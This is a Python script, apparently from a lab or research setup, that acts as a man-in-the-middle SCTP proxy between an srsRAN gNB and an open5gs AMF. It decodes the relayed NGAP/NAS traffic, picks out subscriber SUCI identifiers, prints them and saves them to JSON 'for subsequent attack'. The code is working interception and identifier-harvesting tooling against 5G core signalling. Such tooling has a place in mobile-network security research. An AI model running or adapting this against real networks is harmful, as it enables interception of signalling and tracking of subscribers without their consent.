import sctp
import socket
import threading
import json
import time
import os.path
from pycrate_asn1dir import NGAP
from pycrate_mobile.NAS5G import *
from binascii import unhexlify

# For debugging purposes
# Displays additional info, such as occurring SUCIs
debug = True

GNB_IP = '172.22.0.37'      # IP of srsRAN gNB
AMF_IP = '172.22.0.10'      # IP of open5gs AMF     
MITM_IP = '172.22.0.40'     # IP of MitM     
SCTP_PORT_GNB_AMF = 38412   # Port that is used for SCTP communication between AMF and gNB

# Extracts NAS5G message out of decoded NGAP message
def extract_nas_message(ngap_pdu_val):
    if 'initiatingMessage' in ngap_pdu_val:
        initiating_message = ngap_pdu_val[1]
        if 'value' in initiating_message:
            value = initiating_message['value']
            if 'InitialUEMessage' in value:
                return value[1]['protocolIEs'][1]['value'][1]
            elif 'UplinkNASTransport' in value:
                return value[1]['protocolIEs'][2]['value'][1]
    return None

# Saves 5GSID tag that encloses SUCI within JSON file
def save_suci_json(nas_5gsid_object):
    try:
        save_path = '/app/data/'
        current_time = time.strftime("%H%M%S")
        filename = f"suci_{current_time}.json"
        filename_with_path = os.path.join(save_path, filename)
        with open(filename_with_path, "w") as json_file:
            json.dump(nas_5gsid_object, json_file, indent=4)
            print(f"SUCI saved as {filename} in JSON!")
    except Exception as e:
        print(f"An error occurred while saving SUCI json: {e}")

# Finds 5GSID tag that encloses any ocurring SUCI
def find_suci(nas_object):
    try:
        if "5GMMSecProtNASMessage" in nas_object:
            nas_object_unwrapped = nas_object["5GMMSecProtNASMessage"]
            for element in nas_object_unwrapped:
                if "5GMMIdentityResponse" in element:
                    identity_response = element["5GMMIdentityResponse"]
                    for item in identity_response:
                        if "5GSID" in item:
                            gsid_list = item["5GSID"]
                            for gsid_item in gsid_list:
                                if "5GSID" in gsid_item:
                                    value_list = gsid_item["5GSID"]
                                    for value_item in value_list:
                                        if "Value" in value_item:
                                            suci_imsi = value_item["Value"]
                                            if "SUCI_IMSI" in suci_imsi:
                                                return gsid_list
        return None
    except Exception as e:
        print(f"An error occurred while finding SUCI: {e}")
        return None

# Extracts SUCI out of 5GSID tag
def extract_suci(nas_5gsid_object):
    suci_object = {}

    # ProtSchemeID speicifies ECIES Profile:
    # 1 is Profile A, 2 is Profile B
    def get_suci_scheme_name(prot_scheme_id):
        if prot_scheme_id == 1:
            return "_SUCI_ECIESProfA"
        elif prot_scheme_id == 2:
            return "_SUCI_ECIESProfB"
        return None

    # The JSON Object is traversed
    # The relevant fields for displaying the SUCI are stored in 'suci_object'
    try:
        for gsid_item in nas_5gsid_object:
            if "5GSID" in gsid_item:
                nas_suci_object = gsid_item["5GSID"]
                for nas_suci_elem in nas_suci_object:
                    if "Value" in nas_suci_elem:
                        suci_imsi_object = nas_suci_elem["Value"]["SUCI_IMSI"]
                        for suci_imsi_elem in suci_imsi_object:
                            if "PLMN" in suci_imsi_elem:
                                suci_object['PLMN'] = suci_imsi_elem['PLMN']
                            elif "RoutingInd" in suci_imsi_elem:
                                suci_object['RoutingInd'] = suci_imsi_elem['RoutingInd']
                            elif "ProtSchemeID" in suci_imsi_elem:
                                suci_object['ProtSchemeID'] = suci_imsi_elem['ProtSchemeID']
                            elif "HNPKID" in suci_imsi_elem:
                                suci_object['HNPKID'] = suci_imsi_elem['HNPKID']
                            elif "Output" in suci_imsi_elem:
                                suci_scheme_name = get_suci_scheme_name(suci_object.get('ProtSchemeID'))
                                if suci_scheme_name:
                                    suci_output_object = suci_imsi_elem['Output'][suci_scheme_name]
                                    for suci_output_elem in suci_output_object:
                                        if "ECCEphemPK" in suci_output_elem:
                                            suci_object['ECCEphemPK'] = suci_output_elem['ECCEphemPK']
                                        if "CipherText" in suci_output_elem:
                                            suci_object['CipherText'] = suci_output_elem['CipherText']
                                        if "MAC" in suci_output_elem:
                                            suci_object['MAC'] = suci_output_elem['MAC']
                                else:
                                    print("No valid ProtSchemeID found!")
        return suci_object
    except Exception as e:
        print(f"An error occurred while extracting SUCI: {e}")
        return None

def decode_traffic(data, direction):
    try:
        # Decode the NGAP message using Pycrate
        ngap_pdu = NGAP.NGAP_PDU_Descriptions.NGAP_PDU
        ngap_pdu.from_aper(data)

        nas_msg = extract_nas_message(ngap_pdu.get_val())
        if nas_msg:
            # Decode NAS5G message
            nas_decoded, err = parse_NAS5G(nas_msg)

            nas_json = nas_decoded.to_json()
            nas_object = json.loads(nas_json)

            # Find SUCI from the NAS message
            suci_5gsid = find_suci(nas_object)

            if suci_5gsid:
                if debug:
                    # Extract SUCI as object
                    suci_obj = extract_suci(suci_5gsid)
                    if suci_obj:
                        suci_str = "0" + suci_obj['PLMN'] + \
                            suci_obj['RoutingInd'] + str(suci_obj['ProtSchemeID']) + \
                            str(suci_obj['HNPKID']) + suci_obj['ECCEphemPK'] + \
                            suci_obj['CipherText'] + suci_obj['MAC']

                        print(f"Found SUCI: {suci_str}")
                
                # Save SUCI within 5GSID as JSON for subsequent attack
                save_suci_json(suci_5gsid)

    except Exception as e:
        print(f"Failed to decode/process NGAP message: {e}")

# Function to handle forwarding from source to destination
def forward_traffic(src_socket, dst_socket, direction):
    try:
        while True:
            data = src_socket.recv(4096)
            if data:
                if debug:
                    print(f"[{direction}] Forwarding data: {data}")
                decode_traffic(data, direction)
                dst_socket.send(data)
            else:
                print(f"[{direction}] No more data. Closing connection.")
                break
    except Exception as e:
        print(f"[{direction}] Error while forwarding traffic: {e}")
    finally:
        src_socket.close()
        dst_socket.close()

def main():
    try:
        # Socket to communicate with srsRAN gNB
        gnb_socket = sctp.sctpsocket_tcp(socket.AF_INET)
        gnb_socket.bind((MITM_IP, SCTP_PORT_GNB_AMF))
        gnb_socket.listen(5)
        print("Waiting for connection from gNB...")

        conn_gnb, addr_gnb = gnb_socket.accept()
        print(f"Connected to gNB: {addr_gnb}")

        # Socket to communicate with open5GS AMF
        amf_socket = sctp.sctpsocket_tcp(socket.AF_INET)
        amf_socket.connect((AMF_IP, SCTP_PORT_GNB_AMF))
        print(f"Connected to AMF at {AMF_IP}:{SCTP_PORT_GNB_AMF}")

        # Start threads for bidirectional forwarding
        thread1 = threading.Thread(target=forward_traffic, args=(conn_gnb, amf_socket, "gNB -> AMF"))
        thread2 = threading.Thread(target=forward_traffic, args=(amf_socket, conn_gnb, "AMF -> gNB"))

        thread1.start()
        thread2.start()

        thread1.join()
        thread2.join()

    except KeyboardInterrupt as e:
        print("Sniffer interrupted by user. Exiting.")
        sys.exit(0)

if __name__ == "__main__":
    main()